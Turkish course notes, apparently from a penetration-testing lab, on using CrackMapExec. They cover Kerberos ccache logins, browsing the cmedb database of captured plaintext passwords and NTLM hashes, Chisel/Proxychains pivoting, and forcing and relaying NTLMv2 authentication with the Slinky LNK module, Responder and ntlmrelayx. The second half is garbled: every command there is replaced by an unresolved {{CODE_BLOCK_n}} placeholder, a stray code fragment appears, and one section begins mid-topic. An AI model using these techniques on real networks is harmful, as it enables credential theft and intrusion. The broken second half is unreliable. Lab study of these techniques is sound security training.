Kerberos kimlik doğrulama yöntemimiz olarak `KRB5CCNAME` environment variable'ini kullanmak için `--use-kcache` seçeneğini kullanmamız gerekir. Kullanıcı adı ve parola seçenekleri gerekli değildir.


### ccache Dosyasını Kerberos Kimlik Doğrulama Yöntemi Olarak Kullanma (SMB Protokolü)

```
crackmapexec smb 10.129.203.121 --use-kcache

SMB 10.129.203.121 445 DC01 [*] Windows 10.0 Build
17763 x64 (name:DC01) (domain:inlanefreight.htb) (signing:True)
(SMBv1:False)
SMB 10.129.203.121 445 DC01 [+]
inlanefreight.htb\robert from ccache
```


### Kerberos Kimlik Doğrulama Yöntemi Olarak ccache Dosyasının Kullanılması (LDAP Protokolü)

```
crackmapexec ldap 10.129.203.121 --use-kcache

SMB 10.129.203.121 445 DC01 [*] Windows 10.0 Build
17763 x64 (name:DC01) (domain:inlanefreight.htb) (signing:True)
(SMBv1:False)
LDAP 10.129.203.121 389 DC01 [+]
inlanefreight.htb\robert from ccache

```

Kerberos Kimlik Doğrulamasını `MSSQL` protokolü ile kullanmak için hedef olarak IP adresi yerine bilgisayar adını veya FQDN'yi belirtmemiz gerekir. Bunun nedeni, MSSQL protokolünün perde arkasında IP'yi FQDN'ye dönüştürmemesi, ancak SMB ve LDAP protokollerinin bunu yapmasıdır.


### MSSQL Protokolü ile ccache Dosyasını Kullanma

```
crackmapexec mssql dc01 --use-kcache

MSSQL dc01.inlanefreight.htb 1433 DC01 [*] Windows
10.0 Build 17763 (name:DC01) (domain:inlanefreight.htb)
MSSQL dc01.inlanefreight.htb 1433 DC01 [+]
inlanefreight.htb\robert from ccache (Pwn3d!)
```

Kullanıcı adları ve parolalarla yaptığımız gibi Kerberos kimlik doğrulaması ile herhangi bir modülü veya seçeneği çalıştırabiliriz


### Kerberos Kimlik Doğrulaması ile Paylaşımları Listeleme


```
crackmapexec smb 10.129.203.121 --use-kcache --shares

SMB         10.129.203.121 445    DC01         [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:inlanefreight.htb) (signing:True)
(SMBv1:False)

SMB         10.129.203.121 445    DC01         [+]
inlanefreight.htb\robert from cache

SMB         10.129.203.121 445    DC01         [+] Enumerated shares
SMB         10.129.203.121 445    DC01         Share
SMB         10.129.203.121 445    DC01         Permissions
SMB         10.129.203.121 445    DC01         Remark
SMB         10.129.203.121 445    DC01         ----    ----

SMB         10.129.203.121 445    DC01         ADMIN$           ADMIN$   READ
Remote Admin
SMB         10.129.203.121 445    DC01         C$               READ

SMB         10.129.203.121 445    DC01         Default share    carlos
SMB         10.129.203.121 445    DC01         Default share    D$
SMB         10.129.203.121 445    DC01         Default share    david
SMB         10.129.203.121 445    DC01         IPC$             IPC$     READ
Remote IPC
SMB         10.129.203.121 445    DC01         IT               READ,WRITE
SMB         10.129.203.121 445    DC01         john
SMB         10.129.203.121 445    DC01         julio
SMB         10.129.203.121 445    DC01         linux01          READ,WRITE
SMB         10.129.203.121 445    DC01         NETLOGON         READ
Logon server share
SMB         10.129.203.121 445    DC01         SVC_WORKSTATIONS READ
SMB         10.129.203.121 445    DC01         SYSVOL           READ
Logon server share

```


CrackMapExec ile Kerberos Authentication'ın nasıl kullanılacağını öğrendik. Aşağıdaki bölümde, CrackMapExec veritabanı `cmedb` ile etkileşime gireceğiz

---


### CMEDB'de Uzmanlaşmak

CME otomatik olarak tüm kullanılan/dump edilen kimlik bilgilerini (diğer bilgilerle birlikte) ilk çalıştırmada kurulan `SQLite` veritabanında saklar. Tüm çalışma alanları ve ilgili veritabanları `~/.cme/workspaces` içinde saklanır. Varsayılan veritabanları `~/.cme/workspaces/default` dizininde bulunur. Bu dizinde her protokol için bir SQLite dosyası bulunur.


### Varsayılan Veritabanlarını Listeleme

```
ls ~/.cme/workspaces/default/

ftp.db ldap.db mssql.db rdp.db smb.db ssh.db winrm.db
```

### Veritabanı ile Etkileşim

CME, back-end veritabanı ile etkileşimi kolaylaştıran ikinci bir komut satırı script'i olan `cmedb` ile birlikte gelir. cmedb komutunu yazmak bizi bir komut shell'i götürecektir:

### CMEDB

```
cmedb
cmedb (default) >
```


### Workspaces

Varsayılan workspace adı `default` olarak adlandırılır (bilgi `prompt` gösterildiği gibi). Bir workspace seçildiğinde, CME'de yaptığımız her şey bu workspace'de saklanacaktır. Bir workspace oluşturmak için, `cmedb (default) >` komut promt root'una gitmemiz gerekir. Eğer protokol veritabanındaysak, geri komutunu kullanmamız gerekir.


### Creating a Workspace

```
cmedb
cmedb (default)(smb) > back
cmedb (default) > workspace create inlanefreight
[*] Creating workspace 'inlanefreight'
[*] Initializing FTP protocol database
[*] Initializing SSH protocol database
[*] Initializing RDP protocol database
[*] Initializing LDAP protocol database
[*] Initializing MSSQL protocol database
[*] Initializing SMB protocol database
[*] Initializing WINRM protocol database
cmedb (inlanefreight) >
```

Workspace'leri listelemek için `workspace list` , workspace'i değiştirmek için ise `workspace <workspace>` yazabiliriz.


### Workspace'leri Listeleme ve Değiştirme

```
cmedb (inlanefreight) > workspace list
[*] Enumerating Workspaces
default
==> inlanefreight
cmedb (inlanefreight) > workspace default
cmedb (default) >
```


### Bir Protokolün Veritabanına Erişim

cmedb her protokol için bir veritabanına sahiptir, ancak bu modülün yazıldığı sırada yalnızca `SMB` ve `MSSQL` yararlı seçeneklere sahiptir:

| Protokol | Seçenekler                                         |
| -------- | -------------------------------------------------- |
| SMB      | back exit export import groups hosts import shares |
| MSSQL    | back exit export import host import                |
| LDAP     | back exit export import                            |
| WinRM    | back exit export import                            |
| RDP      | back exit export import                            |
| FTP      | back exit export import                            |
| SSH      | back exit export import                            |

Bir protokolün veritabanına erişmek için `proto` `<protocol>` komutunu çalıştırın. Protokol içinde, mevcut seçenekleri görüntülemek için `help` seçeneğini kullanabiliriz:

### SMB Protokol Veritabanına Bağlanma

```
cmedb (default) > proto smb
cmedb (default)(smb) > help
Documented commands (type help <topic>):
========================================
help
Undocumented commands:
======================
back creds exit export groups hosts import shares
```


### Protocol Options

SMB veya MSSQL protokolünü her kullandığımızda, kimlik bilgileri, saldırdığımız hostlar, eriştiğimiz paylaşımlar ve listelediğimiz gruplar CrackMapExec veritabanında saklanır. Veritabanında sahip olduğumuz verilere erişelim.

### Kimlik Bilgilerini Görüntüleme

CrackMapExec veritabanı, CrackMapExec kullanarak kullandığımız veya elde ettiğimiz tüm kimlik bilgilerini depolar. Bu veritabanı, kimlik bilgilerinin türünü, `düz metin` veya `hash` olup olmadığını, domain, kullanıcı adı ve şifreyi saklar. SMB protokolünün kimlik bilgilerini görmek için protokol içindeki `creds` seçeneğini kullanmamız gerekir.


### Displaying SMB Credentials

```
cmedb (default) (smb) > creds

+Credentials--------------------------------------------------------------------------------------------------+
| CredID | Admin On | CredType | Domain      | UserName    | Password                                                    |
+-------------------------------------------------------------------------------------------------------------+
| 1      | 0 Host(s) | plaintext | INLANEFREIGHT | peter       | Password123                                                 |
| 2      | 2 Host(s) | plaintext | INLANEFREIGHT | robert      | Inlanefreight01!                                            |
| 3      | 0 Host(s) | plaintext | INLANEFREIGHT | grace       | Inlanefreight01!                                            |
| 4      | 4 Host(s) | plaintext | INLANEFREIGHT | julio       | Password1                                                   |
+-------------------------------------------------------------------------------------------------------------+
<SNIP>

<SNIP>

| 40     | 0 Host(s) | hash     | INLANEFREIGHT | kiosko      | aad3b435b51404eeaad3b435b51404ee:f399c1b9e7f851b949767163c35ae296 |
| 41     | 0 Host(s) | hash     | INLANEFREIGHT | testaccount | aad3b435b51404eeaad3b435b51404ee:e02ca966c5c0b22eba3c8c4c5ae568b1 |
+-------------------------------------------------------------------------------------------------------------+
cmedb (default) (smb) > creds julio

+Credentials--------------------------------------------------------------------------------------------------+
| CredID | Admin On | CredType | Domain      | UserName    | Password                                                    |
+-------------------------------------------------------------------------------------------------------------+
| 4      | 4 Host(s) | plaintext | INLANEFREIGHT | julio       | Password1                                                   |
+-------------------------------------------------------------------------------------------------------------+

| 26     | 0 Host(s) | hash     | INLANEFREIGHT | julio       | 64f12cdda88057e06a81b54e73b949b |
+-------------------------------------------------------------------------------------------------------------+
```


Gördüğünüz gibi, creds'ten sonra bir `kullanıcı adı` ekleyerek belirli kullanıcıları da sorgulayabiliriz. Ayrıca `creds hash` seçeneği ile tüm hash'leri veya `creds plaintext` seçeneği ile tüm plaintext kimlik bilgilerini listeleyebiliriz.


### Hash'leri ve Düz Metin Kimlik Bilgilerini Görüntüleme

```
cmedb (default)(smb) > creds hash

+Credentials---------+----------+---------------+--------------------+---------------------------------------------------------------+
| CredID | Admin On | CredType | Domain      | UserName    | Password                                                    |
+--------+-----------+----------+---------------+--------------------+---------------------------------------------------------------+
<SNIP>
| 24     | 0 Host(s) | hash     | DC01         | Guest       | aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0 |
| 25     | 0 Host(s) | hash     | DC01         | DefaultAccount | aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0 |
| 26     | 0 Host(s) | hash     | INLANEFREIGHT | julio       | 64f12cddaa88057e06a81b54e73b949b |
<SNIP>
+--------+-----------+----------+---------------+--------------------+---------------------------------------------------------------+

cmedb (default)(smb) > creds plaintext

+Credentials---------+-----------+-----------------+--------------------+----------------------------------+
| CredID | Admin On | CredType | Domain      | UserName    | Password                       |
+--------+-----------+-----------+-----------------+--------------------+----------------------------------+
| 1      | 0 Host(s) | plaintext | INLANEFREIGHT | peter       | Password123                    |
| 2      | 2 Host(s) | plaintext | INLANEFREIGHT | robert      | Inlanefreight01!               |
| 3      | 0 Host(s) | plaintext | INLANEFREIGHT | grace       | Inlanefreight01!               |
<SNIP>
+--------+-----------+-----------+-----------------+--------------------+----------------------------------+
```


Not: cmedb, mevcut seçenekleri görüntülemek için sekme otomatik tamamlamaya izin verir

MSSQL kimlik bilgileri MSSQL protokolüne kaydedilir ve SMB kimlik bilgilerini görüntülediğimiz gibi görüntülenebilir


### MSSQL için Kimlik Bilgilerini Görüntüleme

```
cmedb
cmedb (default)(smb) > back
cmedb (default) > proto mssql
cmedb (default)(mssql) > creds

+Credentials---------+-----------+---------------+---------------+------------------------------------------+
| CredID | Admin On | CredType | Domain      | UserName    | Password                               |
+--------+-----------+-----------+---------------+---------------+------------------------------------------+
| 1      | 0 Host(s) | plaintext | DC01         | nicole       | Database2                              |
<SNIP>
| 6      | 0 Host(s) | hash      | INLANEFREIGHT | julio        | 64F12CDDAA88057E06A81B54E73B949B      |
| 7      | 0 Host(s) | plaintext | INLANEFREIGHT | julio        | Password1                               |
+--------+-----------+-----------+---------------+---------------+------------------------------------------+
```

Not: Domain alanını bir bilgisayar ile görüyorsak, bu bir MSSQL hesabı kullandığımız anlamına gelir.

### Kimlik Bilgilerini Kullanma

CrackMapExec'i çalıştırmak için veritabanındaki kimlik bilgilerini de kullanabiliriz. Kullanmak istediğimiz kimlik bilgilerini tanımlamamız ve hangi id'nin hesapla ilişkili olduğunu belirlememiz gerekir. `Julio`'nun kimlik bilgilerini `id 4` ile kullanalım. Kullanıcı adı ve parola yerine bir kimlik bilgisi kullanmak için `-id CredID` seçeneğini kullanmamız gerekir.

### CrackMapExec ile Etkileşim için CredID Kullanımı

```
crackmapexec smb 10.129.203.121 -id 4 -x whoami

SMB 10.129.203.121 445 DC01 [*] Windows 10.0 Build
17763 x64 (name:DC01) (domain:inlanefreight.htb) (signing:True)
(SMBv1:False)
SMB 10.129.203.121 445 DC01 [+]
INLANEFREIGHT\julio:Password1 (Pwn3d!)
SMB 10.129.203.121 445 DC01 [+] Executed command
SMB 10.129.203.121 445 DC01 inlanefreight\julio
```


### Hosts Information

MSSQL ve SMB için, erişim sağladığımız bilgisayarları, IP'lerini, domainlerini ve işletim sistemlerini de belirleyebiliriz.


### Displaying Hosts

```
cmedb
cmedb (default)(smb) > hosts

+Hosts---+-----------+--------------------------------+-----------------+--------------------------------+--------------------------+-------+---------+
| HostID | Admins    | IP                             | Hostname        | Domain         | OS                       | SMBv1 | Signing |
+--------+-----------+--------------------------------+-----------------+--------------------------------+--------------------------+-------+---------+
| 1      | 1 Cred(s) | 10.129.203.121                 | DC01            | INLANEFREIGHT  | Windows 10.0 Build 17763 | 0     | 1       |
| 2      | 3 Cred(s) | 10.129.204.23                  | MS01            | INLANEFREIGHT  | Windows 10.0 Build 17763 | 0     | 0       |
<SNIP>
| 9      | 1 Cred(s) | dead:beef::8c8a:5209:5876:537d | MS01            | INLANEFREIGHT  | Windows 10.0 Build 17763 | 0     | 0       |
| 11     | 0 Cred(s) | dc01.inlanefreight.htb         | DC01            | INLANEFREIGHT  | Windows 10.0 Build 17763 | 0     | 1       |
+--------+-----------+--------------------------------+-----------------+--------------------------------+--------------------------+-------+---------+

cmedb (default)(smb) > hosts ms01

+Hosts---+-----------+--------------------------------+----------+--------------------------------+--------------------------+-------+---------+
| HostID | Admins    | IP                             | Hostname | Domain         | OS                       | SMBv1 | Signing |
+--------+-----------+--------------------------------+----------+--------------------------------+--------------------------+-------+---------+
| 2      | 3 Cred(s) | 10.129.204.23                  | MS01     | INLANEFREIGHT  | Windows 10.0 Build 17763 | 0     | 0       |
| 9      | 1 Cred(s) | dead:beef::8c8a:5209:5876:537d | MS01     | INLANEFREIGHT  | Windows 10.0 Build 17763 | 0     | 0       |
+--------+-----------+--------------------------------+----------+--------------------------------+--------------------------+-------+---------+
```


### Share Information

CME veritabanı da belirlediğimiz paylaşımlı klasörleri saklıyor ve okuma ve yazma erişimine sahip kullanıcılarımız olup olmadığını bize söylüyor. Paylaşım bilgilerine erişmek için `cmedb` içerisinde SMB protokolü içerisinde `shares` seçeneğini kullanmamız gerekiyor.

### Paylaşımları Geri Alma

```
cmedb
cmedb (default)(smb) > shares

+---------+----------+------------------+---------------------------------------------+-------------+--------------+
| ShareID | computer | Name             | Remark                                     | Read Access | Write Access |
+---------+----------+------------------+---------------------------------------------+-------------+--------------+
| 1       | DC01     | ADMIN$           | Remote Admin                               | 0 User(s)   | 0 Users      |
| 2       | DC01     | C$               | Default share                              | 0 User(s)   | 0 Users      |
| 3       | DC01     | carlos           |                                            | 0 User(s)   | 0 Users      |
<SNIP>
| 33      | MS01     | ADMIN$           | Remote Admin                               | 1 User(s)   | 1 Users      |
| 34      | MS01     | C$               | Default share                              | 1 User(s)   | 1 Users      |
| 35      | MS01     | CertEnroll       | Active Directory Certificate Services share | 1 User(s)   | 1 Users      |
+---------+----------+------------------+---------------------------------------------+-------------+--------------+
```


### Kullanıcı Ekleme ve Kaldırma

CME, kullanıcıları veritabanından manuel olarak ekleme veya kaldırma özelliğini destekler. Protokolü (SMB veya MSSQL) seçiyoruz ve `creds add` veya `creds remove` kullanıyoruz.


### cmedb'ye Kullanıcı Ekleme

```
cmedb
cmedb (default)(smb) > creds add
[!] Format is 'add domain username password
cmedb (default)(smb) > creds add INLANEFREIGHT john Password3
```

Şimdi eklediğimiz kullanıcıyı kaldırmayı deneyebiliriz.

### Bir Kullanıcıyı cmedb'den Kaldırma

```
cmedb
cmedb (default)(smb) > creds remove
[!] Format is 'remove <credID>'
cmedb (default)(smb) > creds 45
```


### Empire Kimlik Bilgilerini İmport Etme

cmedb'nin sahip olduğu bir başka özellik de `Empire`'dan kimlik bilgilerini import etme yeteneğidir.


### Import from Empire

```
cmedb
cmedb (default)(smb) > import empire
[-] Unable to connect to Empire's RESTful API server:
HTTPSConnectionPool(host='127.0.0.1', port=1337): Max retries exceeded
with url: /api/admin/login (Caused by
NewConnectionError('<urllib3.connection.HTTPSConnection object at
0x7f5d248fabe0>: Failed to establish a new connection: [Errno 111]
Connection refused'))
```

Not: Bu özelliği kullanmak istiyorsanız `Empire`'ı yapılandırdığınızdan emin olun

### Export cmedb Data

CrackMapExec veritabanından kimlik bilgilerini, hostları, local adminleri ve paylaşımları export edebiliriz.

### Kimlik Bilgilerini cmedb'den Export Etme

```
cmedb
cmedb (default)(smb) > export invalid
[-] invalid argument, specify creds, hosts, local_admins, or shares
cmedb (default)(smb) > export creds
[-] invalid arguments, export creds <simple/detailed> <filename>
cmedb (default)(smb) > export creds detailed detailed_creds.csv
[+] creds exported
cmedb (default)(smb) > export shares detailed detailed_shares.csv
[+] creds exported
cmedb (default)(smb) > export local_admins detailed
detailed_local_admins.csv
[+] Local Admins exported
cmedb (default)(smb) > exit
```

```
cat detailed_local_admins.csv
"id";"userid";"computer"
"1";"INLANEFREIGHT/julio";"DC01"
"2";"INLANEFREIGHT/julio";"MS01"
<SNIP>
```

Veriler CSV dosyası olarak dışa aktarılır. `LibreOffice` veya `Excel` gibi araçları kullanarak açabiliriz.

![Pasted image 20241203155509.png](/img/user/resimler/Pasted%20image%2020241203155509.png)


### Son

CrackMapExec, ağ güvenliği testlerinde ve sızma testlerinde kullanıcıların işini kolaylaştıran, etkili bir araçtır. Geniş protokol desteği, hızlı keşif, güvenlik açıkları tespiti ve yönetimsel haklar elde etme gibi çeşitli özellikleriyle güvenlik profesyonellerinin vazgeçilmez araçları arasında yer alır. Bu araç, ağ yapılarının daha güvenli hale getirilmesi için önemli bir rol oynar ve her güvenlik uzmanının repertuarında bulunması gereken bir araçtır.


, 'print

Dizine gidebilir ve kullanıcının erişebileceği tüm dosyaların bir listesini alabiliriz:


### Kullanıcının Kullanabileceği Dosyaları Listeleme

{{CODE_BLOCK_94}}

Eğer paylaşımın tüm içeriğini indirmek istiyorsak `READ_ONLY=false` seçeneğini aşağıdaki gibi kullanabiliriz:

{{CODE_BLOCK_95}}

{{CODE_BLOCK_96}}

Not: Sabırlı olmamız gerekiyor. Paylaşılan klasör ve dosya sayısına bağlı olarak işlem birkaç dakika sürebilir

`spider_plus` modülü için mevcut tüm seçenekleri görüntülemek için `--options` seçeneğini kullanabiliriz:


### Spider_plus Options

{{CODE_BLOCK_97}}

Bir sonraki bölümde CrackMapExec'in bir `proxy` aracılığıyla diğer ağlara ulaşmak için nasıl kullanılacağı anlatılacaktır.


---


### Proxychains with CME

### Scenario

İnternal bir Pentest üzerinde çalışıyoruz. Bir ağ taraması gerçekleştirdik ve yalnızca bir host (10.129.204.133) tespit edip ele geçirebildik. Ele geçirilen bu host üzerinde `ipconfig` çalıştırdığımızda, iki ağ bağdaştırıcısı olduğunu fark ettik. ARP tablosu `172.16.1.10` IP adresine sahip başka bir hostu gösteriyor. Topladığımız bilgilere dayanarak aşağıdaki senaryoya sahibiz:

![Pasted image 20241202141946.png](/img/user/resimler/Pasted%20image%2020241202141946.png)

DC01'e ve bu ağdaki (172.16.1.0/24) herhangi bir makineye saldırmak için, saldırı hostumuz ile MS01 arasında bir `tünel` kurmalıyız. Bu nedenle, CME tarafından yürütülen tüm komutlar MS01 üzerinden geçer.


### Set Up the Tunnel

Tünelimizi kurmak için [Chisel](https://github.com/jpillora/chisel) kullanacağız. [Release](https://github.com/jpillora/chisel/releases)'e gidelim ve saldıracağımız makinemiz için en son Windows binary'sini ve saldırı hostumuzda kullanmak için en yeni Linux binary'sini indirelim ve aşağıdaki adımları gerçekleştirelim:

*  Chisel'ı Saldırı Hostumuza indirin ve Çalıştırın:

### Chisel - Reverse Tunnel

{{CODE_BLOCK_98}}


*  Chisel for Windows'u İndirin ve Hedef Host'a Yükleyin:


### Upload Chisel

{{CODE_BLOCK_99}}


* CrackMapExec komut yürütme seçeneği `-x`'i kullanarak Chisel sunucumuza bağlanmak için `chisel.exe` dosyasını çalıştırın (Bu seçeneği Komut Yürütme bölümünde daha fazla tartışacağız)


### Connect to the Chisel Server

{{CODE_BLOCK_100}}

Bu terminaldeki komut, hedef makinadaki **Chisel** process'ini durdurana kadar çalışmaya devam edecektir. Bunu bu bölümde daha sonra yapacağız.

**Attack host** üzerinde, **Chisel server** çıktısında **bir client bağlantısı aldığımızı ve tüneli başlattığımızı** gösteren yeni bir satır görmeliyiz.

### Chisel Receiving Session No. 1

{{CODE_BLOCK_101}}

TCP 1080 portunun dinlenip dinlenmediğini kontrol ederek de tünelin çalıştığını doğrulayabiliriz:


### Check Listening Port

{{CODE_BLOCK_102}}

* Proxyychains'i Chisel varsayılan portu `TCP 1080`'i kullanacak şekilde yapılandırmamız gerekir. Yapılandırma dosyasının ProxyList bölümüne `socks5 127.0.0.1 1080`'i aşağıdaki gibi eklediğimizden emin olmamız gerekiyor:


### Configure Proxychains

{{CODE_BLOCK_103}}

* Artık 172.16.1.10 IP'sine ulaşmak için `Proxychains` aracılığıyla CrackMapExec'i kullanabiliriz:

### CrackMapExec'in Proxychains ile Test Edilmesi

{{CODE_BLOCK_104}}


Proxychains çıktısını konsoldan kaldırmak için `Proxychains4` ve `quiet -q` seçeneğini kullanabiliriz:

### Quiet Seçeneği ile Proxychains4

{{CODE_BLOCK_105}}

Proxychains aracılığıyla herhangi bir CME işlemi gerçekleştirebiliriz.


### Killing Chisel on the Target Machine

İşimiz bittiğinde, Chisel process'ini kill etmemiz gerekir. Bunu yapmak için, PowerShell komutlarını yürütmek için `-X` seçeneğini kullanacağız ve PowerShell komutunu çalıştıracağız `Stop-Process - Name chisel -Force .` Komut yürütme konusunu Komut Yürütme bölümünde daha ayrıntılı olarak ele alacağız.


### Kill the Chisel Client

{{CODE_BLOCK_106}}

Bunu yaptıktan sonra, Chisel client komutunu çalıştırdığımız terminal aşağıdaki gibi sonuçlanmalıdır:


### Chisel'i Zorla Durdurduktan Sonra Terminalin Kapanması

{{CODE_BLOCK_107}}

Artık saldırı konağımızdaki Chisel sunucusunu CTRL + C ile kapatabiliriz.


### Attack Host Üzerinde Chisel'i Kapatma

{{CODE_BLOCK_108}}


### Sunucu olarak Windows ve Client olarak Linux

Chisel'i Windows workstation'da bir sunucu olarak başlatarak ve saldırı hostumuzu client olarak kullanarak bunun tersini de yapabiliriz. Chisel'i sunucu olarak başlatmak için `server --socks5` seçeneğini kullanacağız.


### Chisel'i Hedef Makinede Sunucu Olarak Başlatma

{{CODE_BLOCK_109}}

Şimdi hedef makinemiz Chisel sunucusuna bağlanmak ve proxy'yi etkinleştirmek için IP ve porttan sonra `socks` seçeneğini kullanmamız gerekiyor.


### Attack Hostumuzdan Chisel Sunucusuna Bağlanma

{{CODE_BLOCK_110}}

Şimdi Proxychains'i tekrar kullanabiliriz:

### Internal Network'e Bağlanmak için Proxy Chain'i Kullanma

{{CODE_BLOCK_111}}

Bu bölümde, **attack host** üzerinde **Proxychains** ve **Chisel** yapılandırmayı ve **CrackMapExec** kullanarak hedef makinede **Chisel** çalıştırmayı öğrendik.

İlerleyen bölümlerde, diğer ağlara ulaşmak için `CrackMapExec` ve `Proxychains` kullanacağız.

---

### Stealing Hashes

Yeni hesapları ele geçirmek için kullanılan en yaygın tekniklerden biri parola hashlerinin çalınmasıdır. Bunu başarmanın farklı yöntemleri vardır, ancak yaygın olanı, bir bilgisayarı veya kullanıcıyı kontrol ettiğimiz sahte bir paylaşılan klasörle bir kimlik doğrulama işlemi başlatmaya zorlamaktır.

Bu kimlik doğrulama işlemini başlatırken, kullanıcı veya bilgisayar bunu bir NTLMv2 hash'i ile yapar. Bu hash, Hashcat gibi bir araç kullanılarak kırılabilir veya kimlik bilgilerini bilmeden kullanıcının kimliğine bürünmek için başka bir bilgisayara iletilebilir.

Paylaşılan klasörleri kullanarak hash'leri çalmak için bir kısayol oluşturabilir ve kısayolda görünen simge sahte paylaşılan klasörümüzü gösterecek şekilde yapılandırabiliriz. Kullanıcı paylaşılan klasöre girdiğinde, simgenin konumunu aramaya çalışacak ve paylaşılan klasörümüze karşı kimlik doğrulamasını zorlayacaktır.

NTLMv2 hash'lerini toplama hakkında daha fazla bilgi edinmek için RedTeam Ekipler için [Farming blogunu okuyabiliriz: MDsec'ten NetNTLM hasadı](https://www.mdsec.co.uk/2021/02/farming-for-red-teams-harvesting-netntlm/), sadece kısayolların kullanımını değil, aynı amaca hizmet eden diğer dosya türlerini de gösterir.


### Slinky Modülü

`Slinky`, [@byt3bl33d3r](https://twitter.com/byt3bl33d3r) tarafından oluşturulan bir modüldür ve CME'deki en heyecan verici modüllerden biridir. Prensip basittir. Modül, yazma izinlerine sahip tüm paylaşımlarda belirtilen SMB sunucusuna bir UNC yolu içeren simge attribute'a sahip Windows kısayolları oluşturur. Birisi paylaşımı ziyaret ettiğinde, simge attribute'u sunucumuza giden bir UNC yolu içerdiği için `Responder` kullanarak NTLMv2 hash'ini alacağız.

Modülün `SERVER` ve `NAME` olmak üzere iki zorunlu seçeneği ve bir isteğe bağlı `CLEANUP` seçeneği vardır.


### Slinky Module Options

{{CODE_BLOCK_112}}

`SERVER`, kontrol ettiğimiz SMB sunucusunun IP'sine ve UNC yolunun işaret etmesini istediğimiz yere karşılık gelir. `NAME` seçeneği kısayol dosyasına bir isim atar, `CLEANUP` ise işimiz bittiğinde kısayolu silmek içindir.


### Chisel kullanarak bağlama

Bu alıştırma için lokal erişimi simüle edeceğiz ve internal ağa bağlanmak için Chisel ve Proxychains kullanacağız. Chisel zaten hedef makinemizde bir sunucu olarak çalışıyor ve bir client olarak bağlanmamız ve daha sonra internal ağı numaralandırmak için proxychains kullanmamız gerekiyor. Chisel kullanarak bağlanmak için aşağıdaki komutu **kullanalım**


### Hedef Makine Chisel Sunucusuna Bağlanma

{{CODE_BLOCK_113}}


### NTLMv2 Hash'lerinin Çalınması
İlk olarak, `--shares` seçeneğini kullanarak `grace` kullanıcısının `WRITE` ayrıcalıklarına sahip olduğu bir paylaşım bulalım:

### WRITE Ayrıcalıklarına Sahip Paylaşımları Bulma

{{CODE_BLOCK_114}}


Gördüğümüz gibi, `grace` `HR` ve `IT-Tools` paylaşımlarına yazabilir. Bu nedenle her bir paylaşıma bir `LNK` dosyası yazmak için `Slinky` modülünü kullanabiliriz. 

**SERVER=10.10.14.33** seçeneğini kullanarak **attack host**'umuzun **tun0** ağındaki **IP adresini** belirteceğiz ve **NAME=important** seçeneğiyle **LNK dosyasına atanacak dosya adını** belirleyeceğiz.


### Using Slinky

{{CODE_BLOCK_115}}


![Pasted image 20241202171933.png](/img/user/resimler/Pasted%20image%2020241202171933.png)

**Not:** **CrackMapExec**, genellikle **`OpSec` açısından güvenli** olarak kabul edilir çünkü tüm işlemler ya **`bellekte` çalıştırılır**, ya **`WinAPI` çağrılarıyla ağ üzerinden sorgulanır**, ya da **Windows'un built-in araçları/özellikleri** kullanılarak gerçekleştirilir.

Bu gereksinimleri karşılamayan bir modül çalıştırmaya çalıştığımızda, **önceden bir uyarı alırız**. **`Slinky`** modülü, **OpSec açısından güvenli olmayan** bir modüle örnektir. Devam etmeden önce **bir uyarı alacağız**.

LNK dosyası oluşturulduktan sonra, Responder'ı çalıştırmamız ve birinin paylaşıma göz atmasını beklememiz gerekir. 


### Starting Responder

{{CODE_BLOCK_116}}

Not: Hash'i yakalamak için `Responder.conf` dosyasında SMB seçeneği `On` olmalıdır.

NTLMv2 hash'imizi aldık ve hesabı kullanmak için onu kırmamız gerekiyor veya bir `NTLM Relay` yapabiliriz. Bunu kırmak için, `ASREPRoast` ve `Kerberoasting` ile yaptığımız gibi `Hashcat mod 5600`'ü kullanabiliriz. `NTLM Relay`'e odaklanalım.


### **NTLM Relay**

Diğer bir çözüm ise NTLMv2 hash'ini doğrudan `SMB Sign`'nın devre dışı bırakıldığı ağdaki diğer sunuculara ve workstation'lara iletmektir. SMB Sign çok önemlidir çünkü bir bilgisayarda SMB Sign etkinse, saldırı hostumuzun kimliğini kanıtlayamayacağımız için o bilgisayara relay yapamayız. SMB Sign'nın devre dışı bırakıldığı hedeflerin bir listesini almak için `--gen-relay-list` seçeneğini kullanabiliriz.

Şimdi Proxychains'i kullanabilir ve SMB Sign devre dışı bırakılmış makinelerin bir listesini alabiliriz

### Getting Relay List

{{CODE_BLOCK_117}}


**`ntlmrelayx`** aracını, daha önce **`--gen-relay-list`** seçeneğiyle elde ettiğimiz listeyle birlikte kullanacağız.

Hedef makinede **local administrator** ayrıcalıklarına sahip bir hesap bulursak ve ek seçenekler belirtmezsek, **`ntlmrelayx`** otomatik olarak hedef makinenin **`SAM` database**'ini dump edecektir. Bu sayede, herhangi bir **local admin kullanıcısının hash'leriyle** bir **`pass-the-hash attack`** gerçekleştirmeyi deneyebiliriz.

### Execute NTLMRelayX

{{CODE_BLOCK_118}}

Bir kullanıcının **SMB share**'ine erişmesini beklemeliyiz. **LNK dosyamız**, kullanıcının hedef makinemize bağlanmasını zorlar (**bu işlem arka planda gerçekleşir ve kullanıcı herhangi bir anormallik fark etmez**).

Bu gerçekleştiğinde, **`ntlmrelayx`** konsolunda aşağıdakine benzer bir çıktı görmeliyiz:

{{CODE_BLOCK_119}}

Ardından, administrator hash'ini kullanarak hedef makinede kimlik doğrulaması yapmak için crackmapexec'i kullanabiliriz:

### Local Hesapları Test Etme

{{CODE_BLOCK_120}}

### Her Şeyi Temizleyin

Modülü kullandıktan sonra, **LNK dosyasını temizlemek** için **`-o CLEANUP=YES`** seçeneğini ve **LNK dosyasının adını** (**`NAME=important`**) belirtmek kritik önem taşır.

### Cleanup

{{CODE_BLOCK_121}}

### drop-sc Modülü ile Hash'lerin Çalınması

Bu bölümü tamamlamadan önce, **LNK** dışında başka bir dosya formatı kullanarak kimlik doğrulamasını zorlamanın başka bir yöntemine bakalım: **[.searchConnector-ms](https://learn.microsoft.com/en-us/windows/win32/search/search-sconn-desc-schema-entry)** ve **`.library-ms`** formatları. Bu dosya formatlarının çoğu Windows sürümünde **varsayılan dosya ilişkilendirmeleri** bulunur. Windows ile entegre çalışarak içeriği rastgele bir konumdan, hatta **`WebDAV` paylaşımıyla belirtilen remote bir konumdan** gösterebilirler.

